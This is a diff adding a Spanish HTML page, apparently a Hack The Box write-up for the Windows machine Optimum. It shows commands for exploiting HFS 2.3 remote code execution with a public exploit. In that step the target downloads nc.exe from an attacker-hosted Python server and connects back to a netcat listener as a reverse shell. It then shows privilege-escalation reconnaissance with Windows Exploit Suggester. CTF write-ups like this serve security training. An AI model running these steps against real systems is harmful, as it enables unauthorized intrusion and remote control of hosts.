@@ -1,0 +1,86 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Optimum HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/optimum/pasted-20251105120918.png" alt="Optimum HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>Optimum</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>windows</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: HttpFileServer 2.3 expuesto</li>
+            <li><code>Explotación</code>: RCE en HFS 2.3 mediante exploit público</li>
+            <li><code>Escalada de Privilegios</code>: Windows Exploit Suggester identifica vía de escalada local</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <div class="code-card">
+            <h3>Puertos</h3>
+            <pre><code>Port - 80 versión HFS 2.3</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <div class="code-card">
+            <h3>Explotar HFS 2.3</h3>
+            <pre><code># Buscar exploits
+searchsploit hfs 2.3
+searchsploit -m 39161
+# Modificar 39161.py para poner kali_ip y puerto del listener
+
+# Exponer con python un servidor con el recurso nc.exe
+cp &lt;path_nc.exe&gt; .
+python -m http.server 80
+# Listener
+rlwrap nc -nlvp 444
+
+# Ejecutar exploit 2 veces, una para la descarga de nc.exe y otra para ejecutarlo
+python2 39161.py optimum 80</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <div class="code-card">
+            <h3>Windows CMD: Suggester</h3>
+            <pre><code>systeminfo # Copiamos todo el output
+# Kali 
+nano windows_info.txt # Pegamos el contenido
+
+git clone https://github.com/strozfriedberg/Windows-Exploit-Suggester.git
+
+python2 windows-exploit-suggester.py --updates
+
+python2 windows-exploit-suggester.py --database &lt;file.xlsx&gt; --systeminfo windows_info.txt</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/optimum/pasted-20260130024342.png" alt="Optimum HTB" />
+          <p><code>MS16-098</code></p>
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>windows</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
